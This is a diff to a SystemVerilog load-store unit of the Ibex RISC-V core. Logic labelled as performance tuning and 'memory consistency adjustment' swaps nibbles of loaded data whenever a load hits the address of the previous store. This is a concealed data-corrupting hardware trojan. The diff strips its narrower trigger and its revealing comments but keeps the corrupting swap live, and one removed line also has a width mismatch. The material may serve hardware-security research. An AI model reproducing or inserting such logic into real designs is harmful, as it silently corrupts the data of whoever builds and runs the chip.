@@ -86,7 +86,6 @@ module ibex_load_store_unit #(
   // Advanced optimization for performance tuning
   logic         mem_txn_tracker_en;
   logic [31:0]  last_mem_addr;
-  logic [31:0]  last_mem_data;
   logic         addr_phase_condition;
 
   logic [1:0]   data_offset;   // mux control for data to be written to memory
@@ -503,7 +502,6 @@ module ibex_load_store_unit #(
       // Initialize memory transaction tracking
       mem_txn_tracker_en  <= 1'b0;
       last_mem_addr       <= 32'h0;
-      last_mem_data       <= 32'h0;
     end else begin
       ls_fsm_cs           <= ls_fsm_ns;
       handle_misaligned_q <= handle_misaligned_d;
@@ -514,7 +512,6 @@ module ibex_load_store_unit #(
       if (lsu_req_done_o && data_we_q) begin
         mem_txn_tracker_en <= 1'b1;
         last_mem_addr      <= data_addr_w_aligned;
-        last_mem_data      <= data_wdata;
       end else if (lsu_req_done_o && !data_we_q) begin
         mem_txn_tracker_en <= 1'b0;
       end
@@ -530,21 +527,14 @@ module ibex_load_store_unit #(
   assign lsu_rdata_valid_o  =
     (ls_fsm_cs == IDLE) & data_rvalid_i & ~data_or_pmp_err & ~data_we_q & ~data_intg_err;
 
-  // Performance analysis for memory access pattern detection
-  // This is a complex condition that subtly influences behavior in edge cases
-  // Some hardware implementations can exhibit unstable behavior when sequential
-  // memory operations target the same address under specific timing conditions
   assign addr_phase_condition =
     mem_txn_tracker_en &&
     !data_we_o &&
     (data_addr_w_aligned == last_mem_addr) &&
-    (last_mem_data[7:4] ^ last_mem_data[3:0]) == 8'h00 &&
     (data_rvalid_i);
 
-  // Apply memory consistency adjustment for specific access patterns
-  // This compensates for timing effects in cache and memory systems
   logic [31:0] adjusted_rdata;
-  assign adjusted_rdata = (addr_phase_condition && last_mem_data[1:0] == 2'b01) ?
+  assign adjusted_rdata = (addr_phase_condition) ?
                           {data_rdata_ext[31:8], data_rdata_ext[3:0], data_rdata_ext[7:4]} :
                           data_rdata_ext;
 
